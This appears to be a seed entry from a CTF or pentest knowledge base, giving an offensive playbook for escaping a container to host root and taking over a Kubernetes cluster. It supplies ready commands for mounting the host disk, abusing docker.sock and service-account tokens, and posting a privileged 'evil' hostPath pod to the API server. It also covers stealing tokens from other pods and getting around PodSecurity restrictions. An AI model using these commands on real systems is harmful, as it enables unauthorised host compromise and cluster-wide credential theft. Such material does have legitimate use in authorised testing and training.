# [Seed] Container Escape -> Host root (cap_sys_admin / privileged container / docker.sock)

## Scenario Category
Penetration testing / Cloud native / Container security

## Target Overview
We have a shell inside a container (from an application vulnerability, an exposed Jenkins, or RCE on K8s) and need to escape to the host, then move laterally to control the whole K8s cluster.

## Full Execution Chain

1. Enumerate immediately after landing in the container
   ```bash
   id                                    # are we root?
   cat /proc/self/status | grep CapEff   # check capabilities
   capsh --print                         # same thing, friendlier output
   ls -la /var/run/docker.sock           # is the Docker socket mounted in?
   mount | grep -v proc                  # which host directories are mounted
   cat /proc/1/cgroup                    # docker / containerd / kubepods?
   env | grep -i 'kube\|docker\|aws\|az' # service account / metadata tokens
   ls /var/run/secrets/kubernetes.io/serviceaccount/  # K8s SA token
   ```
2. Pick an escape path based on what you found:

   **Path A: privileged container (`--privileged`)**
   ```bash
   # mount the host disk directly
   mkdir /host && mount /dev/sda1 /host
   chroot /host
   # you are now root on the host
   ```

   **Path B: cap_sys_admin / cap_dac_read_search**
   ```bash
   # abuse release_agent for the bypass (CVE-2022-0492 class)
   # or just mount directly using cap_sys_admin
   ```

   **Path C: docker.sock is mounted in**
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host bash
   ```

   **Path D: the K8s SA token has excess permissions**
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   kubectl --token=$TOKEN auth can-i --list
   # if you can create pods, escape by launching a privileged pod with hostPID/hostNetwork/hostPath
   ```

   **Path E: kernel exploit (Dirty Pipe / Dirty COW / OverlayFS)**
   ```bash
   uname -a               # check the kernel version
   # pick an off-the-shelf exploit for the matching CVE
   ```

3. Once out, look for the next hop on the host
   - kubelet credentials (/var/lib/kubelet)
   - container runtime socket (containerd / dockerd)
   - tokens belonging to other pods
   - hostNetwork gives direct access to every service IP in the cluster
4. Spread laterally across the whole K8s cluster

## Pitfalls Encountered

| Problem | Cause | Solution | Time spent |
|------|------|---------|------|
| The container runs as non-root with no capabilities | The application layer is reasonably hardened | Look for setuid binaries / kernel vulnerabilities / vulnerabilities outside the container | several hours |
| docker.sock is visible but unreadable | The socket is root:root 660 | Get the current uid into the docker group (if a setgid program exists), or pivot through another container | 30min |
| Privileged pod launched but the image failed to pull | Internal cluster with an internal docker registry | Use an image already present in the cluster (pick any from kube-system) | 20min |
| The K8s SA token has no permissions | The default SA is usually default/restricted | Try listing pods, find a pod with cluster-admin, and steal its SA token | 1h |
| No usual tooling after chroot | The host runs a minimal distribution | Mount /proc /dev /sys before chroot, or just operate on /host from the original namespace | 30min |
| The cluster enforces PodSecurity Standards | The restricted policy forbids hostPath / privileged | Check whether some namespace has looser admission config; look for an SA with deployment creation rights | several hours |

## Toolchain Findings

- **deepce** automates container escape detection (a single sh script, no dependencies)
- **kdigger** is a Kubernetes/container recon tool that emits structured results
- **peirates** is a TUI dedicated to K8s penetration testing
- **kube-hunter** from Aqua scans clusters for security issues
- **botb (break out the box)** is the veteran container escape tool
- **cdk** is a container pentest Swiss army knife (a Chinese-language project that covers Chinese cloud provider scenarios)

## Key Code/Commands

One-shot self check:

```bash
# grab deepce (no dependencies at all)
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
# output: N escape paths detected
```

Escaping by launching a privileged pod with the K8s SA token:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# check permissions
curl -sk --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -d '{"spec":{"namespace":"default"}}'

# if you can create pods, mount the host filesystem with hostPath
cat <<EOF > evil-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh","-c","sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -sk --header "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  --data-binary @evil-pod.yaml

# then exec into the evil pod and chroot /host
```

Exploiting CVE-2022-0492 (cap_sys_admin without a user namespace):

```bash
# see https://github.com/PaloAltoNetworks/cve-2022-0492
# core idea: mount cgroup -> write release_agent -> trigger an empty cgroup -> execute in the host context
```

## Suggested Improvements to This Package

- `CTF-Sandbox-Orchestrator/competition-agent-cloud/` already exists; add `references/k8s-attack-paths.md` to it
- Add a full "container escape -> cluster takeover" path example to attack-chain
- Add deepce / kdigger / peirates to bootstrap-manifest

## Reusable Patterns/Script Snippets

**Quick reference: five container escape paths**:

```text
1. privileged container -> mount /dev/sda1 /host && chroot /host
2. cap_sys_admin        -> CVE-2022-0492 (release_agent) / mount your own cgroup
3. docker.sock          -> docker run -v /:/host alpine chroot /host
4. K8s SA + permissions -> launch a hostPath/privileged pod
5. kernel CVE           -> DirtyPipe (CVE-2022-0847) / DirtyCred (CVE-2022-2588) / OverlayFS (CVE-2023-0386)
```

**Must-check items once you are out**:

```text
- /var/lib/kubelet/pods/        -> steal SA tokens from other pods
- /var/lib/docker/              -> list the running containers
- ip addr                        -> use hostNetwork to reach service IPs directly
- crictl ps                      -> containerd container list
- ps -ef --forest                -> find the kubelet / dockerd startup arguments (which contain tokens)
```

## Evolution Actions
- [ ] Add k8s-attack-paths.md to CTF-Sandbox-Orchestrator/competition-agent-cloud
- [ ] Add the container escape -> cluster takeover path to attack-chain
- [ ] Add deepce/kdigger/peirates to bootstrap-manifest

## Environment Details
- Attack position: inside a container (any shell entry point works)
- Target: K8s 1.24+ / Docker 20+ / containerd 1.6+
- Kernel: depends on the target; watch the CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386 windows

## Redaction Requirements
This entry is seed data written from public container/K8s security research and does not involve any real cluster.
